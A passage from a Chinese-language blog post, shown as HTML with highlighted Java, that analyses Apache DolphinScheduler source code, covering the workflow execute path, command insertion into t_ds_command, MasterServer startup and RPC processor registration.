根据当前工作流实例的状态判断能否执行对应executeType类型的操作 **/</span></span><br><span class="line">    result = checkExecuteType(processInstance, executeType);</span><br><span class="line">    <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 判断是否已经选择了合适的租户 **/</span></span><br><span class="line">    <span class="keyword">if</span> (!checkTenantSuitable(processDefinition)) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;</span>,</span><br><span class="line">                processDefinition.getId(), processDefinition.getName());</span><br><span class="line">        putMsg(result, Status.TENANT_NOT_SUITABLE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 在executeType为重跑的状态下，获取用户指定的启动参数 **/</span></span><br><span class="line">    Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;Map&lt;String, Object&gt;&gt;() &#123;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="type">String</span> <span class="variable">startParams</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">startParamsJson</span> <span class="operator">=</span> commandMap.get(Constants.CMD_PARAM_START_PARAMS);</span><br><span class="line">        <span class="keyword">if</span> (startParamsJson != <span class="literal">null</span>) &#123;</span><br><span class="line">            startParams = startParamsJson.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 根据不同的ExecuteType去执行相应的操作 **/</span></span><br><span class="line">    <span class="keyword">switch</span> (executeType) &#123;</span><br><span class="line">        <span class="keyword">case</span> REPEAT_RUNNING:<span class="comment">// 重跑</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RECOVER_SUSPENDED_PROCESS:<span class="comment">// 恢复挂载的工作流</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> START_FAILURE_TASK_PROCESS:<span class="comment">// 启动失败的工作流</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> STOP:<span class="comment">// 停止</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getState() == ExecutionStatus.READY_STOP) &#123;</span><br><span class="line">                putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PAUSE:<span class="comment">// 暂停</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123;</span><br><span class="line">                putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            logger.error(<span class="string">&quot;unknown execute type : &#123;&#125;&quot;</span>, executeType);</span><br><span class="line">            putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, <span class="string">&quot;unknown execute type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，以上代码前半部分主要是做了校验的操作，后半部分是根据执行类型来做不同的操作，<strong>操作主要分为两部分：insertCommand以及updateProcessInstancePrepare</strong>。</p><p><a href="https://www.notion.so/execute-58f6ea28eb7f4d4cb8f6ee64c614f670?pvs=21">execute执行接口分析</a></p><p><strong>3.2.1 insertCommand</strong></p><p><strong>DS</strong></p><p>方法代码如下，<strong>其实主要就是把生成命令并插入t_ds_command（执行命令表）</strong>，插入已经添加好注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 插入命令（re run, recovery (pause / failure) execution)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loginUser             登录用户</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> instanceId            工作流实例id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processDefinitionCode 工作流定义id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processVersion        工作流版本</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> commandType           命令类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 操作结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">insertCommand</span><span class="params">(User loginUser, Integer instanceId, <span class="type">long</span> processDefinitionCode, <span class="type">int</span> processVersion, CommandType commandType, String startParams)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 封装启动参数 **/</span></span><br><span class="line">    Map&lt;String, Object&gt; cmdParam = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId);</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.isEmpty(startParams)) &#123;</span><br><span class="line">        cmdParam.put(CMD_PARAM_START_PARAMS, startParams);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line">    command.setCommandType(commandType);</span><br><span class="line">    command.setProcessDefinitionCode(processDefinitionCode);</span><br><span class="line">    command.setCommandParam(JSONUtils.toJsonString(cmdParam));</span><br><span class="line">    command.setExecutorId(loginUser.getId());</span><br><span class="line">    command.setProcessDefinitionVersion(processVersion);</span><br><span class="line">    command.setProcessInstanceId(instanceId);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 判断工作流实例是否正在执行 **/</span></span><br><span class="line">    <span class="keyword">if</span> (!processService.verifyIsNeedCreateCommand(command)) &#123;</span><br><span class="line">        putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 保存命令 **/</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">create</span> <span class="operator">=</span> processService.createCommand(command);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (create &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        putMsg(result, Status.SUCCESS);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.2.2 updateProcessInstancePrepare</strong></p><p><strong>DS</strong></p><p>方法代码如下，已经添加注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 准备更新工作流实例的命令类型和状态</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processInstance 工作流实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> commandType     命令类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> executionStatus 执行状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 更新结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">updateProcessInstancePrepare</span><span class="params">(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    processInstance.setCommandType(commandType);</span><br><span class="line">    processInstance.addHistoryCmd(commandType);</span><br><span class="line">    processInstance.setState(executionStatus);</span><br><span class="line">    <span class="type">int</span> <span class="variable">update</span> <span class="operator">=</span> processService.updateProcessInstance(processInstance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断流程是否正常</span></span><br><span class="line">    <span class="keyword">if</span> (update &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StateEventChangeCommand</span> <span class="variable">stateEventChangeCommand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StateEventChangeCommand</span>(</span><br><span class="line">                processInstance.getId(), <span class="number">0</span>, processInstance.getState(), processInstance.getId(), <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>(processInstance.getHost());</span><br><span class="line">        stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command());</span><br><span class="line">        putMsg(result, Status.SUCCESS);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据流程图，我们可以看到了已经执行了如下红框的代码，也就是把我们的<strong>command已经缓存到了DB。</strong></p><p>接下来需要看看Master的代码。</p><p><img src="/images/image7.png" alt="Alt 7"></p><p><strong>3.3 MasterServer</strong></p><p><strong>DS</strong></p><p><img src="/images/image8.png" alt="Alt 8"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MasterServer</span> <span class="keyword">implements</span> <span class="title class_">IStoppable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(MasterServer.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SpringApplicationContext springApplicationContext;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MasterRegistryClient masterRegistryClient;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TaskPluginManager taskPluginManager;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MasterSchedulerService masterSchedulerService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SchedulerApi schedulerApi;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> EventExecuteService eventExecuteService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> FailoverExecuteThread failoverExecuteThread;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MasterRPCServer masterRPCServer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER);</span><br><span class="line">        SpringApplication.run(MasterServer.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 启动 master server</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> SchedulerException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 RPC服务</span></span><br><span class="line">        <span class="built_in">this</span>.masterRPCServer.start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装任务插件</span></span><br><span class="line">        <span class="built_in">this</span>.taskPluginManager.installPlugin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** MasterServer 注册客户端，用于连接到注册表并传递注册表事件。</span></span><br><span class="line"><span class="comment">         * 当主节点启动时，它将在注册中心注册,并调度一个&#123;<span class="doctag">@link</span> HeartBeatTask&#125;来更新注册表中的元数据**/</span></span><br><span class="line">        <span class="built_in">this</span>.masterRegistryClient.init();</span><br><span class="line">        <span class="built_in">this</span>.masterRegistryClient.start();</span><br><span class="line">        <span class="built_in">this</span>.masterRegistryClient.setRegistryStoppable(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。</span></span><br><span class="line">        <span class="built_in">this</span>.masterSchedulerService.init();</span><br><span class="line">        <span class="built_in">this</span>.masterSchedulerService.start();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.eventExecuteService.start();</span><br><span class="line">        <span class="built_in">this</span>.failoverExecuteThread.start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是调度器的接口，包含操作调度任务的方法。</span></span><br><span class="line">        <span class="built_in">this</span>.schedulerApi.start();</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (Stopper.isRunning()) &#123;</span><br><span class="line">                close(<span class="string">&quot;MasterServer shutdownHook&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 优雅的关闭方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cause 关闭的原因</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(String cause)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// set stop signal is true</span></span><br><span class="line"><span class="comment">// execute only once</span></span><br><span class="line">            <span class="keyword">if</span> (!Stopper.stop()) &#123;</span><br><span class="line">                logger.warn(<span class="string">&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;</span>, cause);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            logger.info(<span class="string">&quot;Master server is stopping, current cause : &#123;&#125;&quot;</span>, cause);</span><br><span class="line"></span><br><span class="line"><span class="comment">// thread sleep 3 seconds for thread quietly stop</span></span><br><span class="line">            ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());</span><br><span class="line"><span class="comment">// close</span></span><br><span class="line">            <span class="built_in">this</span>.schedulerApi.close();</span><br><span class="line">            <span class="built_in">this</span>.masterSchedulerService.close();</span><br><span class="line">            <span class="built_in">this</span>.masterRPCServer.close();</span><br><span class="line">            <span class="built_in">this</span>.masterRegistryClient.closeRegistry();</span><br><span class="line"><span class="comment">// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.</span></span><br><span class="line"><span class="comment">// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc</span></span><br><span class="line">            springApplicationContext.close();</span><br><span class="line"></span><br><span class="line">            logger.info(<span class="string">&quot;MasterServer stopped, current cause: &#123;&#125;&quot;</span>, cause);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;</span>, cause, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">(String cause)</span> &#123;</span><br><span class="line">        close(cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在run方法里面，可以看到，主要依次执行了：</p><ul><li>**① MasterRPCServer.start()**：启动master的rpc服务；</li><li>**② TaskPluginManager.installPlugin()**：安装任务插件；</li><li>**③ MasterRegistryClient.start()**：向Zookeeper注册MasterServer；</li><li>**④ MasterSchedulerService.start()**：主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。</li><li>**⑤ EventExecuteService.start()**：工作流实例执行情况</li><li>**⑥ FailoverExecuteThread()**：故障转移检测</li><li>**⑦ SchedulerApi.start()**：scheduler接口去操作任务实例</li></ul><p><strong>3.1.1 MasterRPCServer</strong></p><p><strong>DS</strong></p><p><strong>Master RPC Server主要用来发送或接收请求给其它系统</strong>。</p><p>初始化方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostConstruct</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 初始化远程服务</span></span><br><span class="line">    <span class="type">NettyServerConfig</span> <span class="variable">serverConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NettyServerConfig</span>();</span><br><span class="line">    serverConfig.setListenPort(masterConfig.getListenPort());</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer = <span class="keyword">new</span> <span class="title class_">NettyRemotingServer</span>(serverConfig);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志服务</span></span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.2.2 TaskPluginManager</strong></p><p><strong>DS</strong></p><p><img src="/images/image9.png" alt="Alt 9"><br><img src="/images/image10.png" alt="Alt 10"></p><p><img src="/images/image11.png" alt="Alt 11"></p><h2 id="到此部分源码解析完成"><a href="#到此部分源码解析完成" class="headerlink" title="到此部分源码解析完成"></a>到此部分源码解析完成</h2><p>整体流程运行</p><p><img src="/images/Untitled%202.png" alt="Untitled"></p><p>用户点击WEB界面的启动工作流按钮。</p><p>apiserver 封装 commnd 到 db（往 t_ds_command 表中插入一条数据）。</p><p>master 扫描到 commad，进行 dga 构建，初始化，将源头 task 提交到 priority 队列中。</p><p>taskConsumer 消费队列数据得到 task，选择一台 worker 分配任务。</p><p>worker 接收到分配任务的消息启动任务。</p><p>worker 返回结果给 master，master 更新任务信息到 db 。</p><p>03</p><p>DolphinScheduler源码剖析</p><p>3.1 apiserver任务执行入口</p><p>当用户在前端点击执行任务，则会向海豚调度的接口发送请求，最终由 ExecutorController 的 startProcessInstance 方法来处理请求。</p><p><img src="/images/Untitled%203.png" alt="Untitled"></p><p>ExecutorController.startProcessInstance() 方法。</p><p>最终会往 mysql 表 t_ds_command 插入一条数据，将要运行的工作流信息写入该表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;start-process-instance&quot;)</span></span><br><span class="line"><span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line"><span class="meta">@ApiException(START_PROCESS_INSTANCE_ERROR)</span></span><br><span class="line"><span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">startProcessInstance</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true)</span> <span class="meta">@PathVariable</span> <span class="type">long</span> projectCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;processDefinitionCode&quot;)</span> <span class="type">long</span> processDefinitionCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;scheduleTime&quot;)</span> String scheduleTime,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;failureStrategy&quot;)</span> FailureStrategy failureStrategy,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;startNodeList&quot;, required = false)</span> String startNodeList,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;taskDependType&quot;, required = 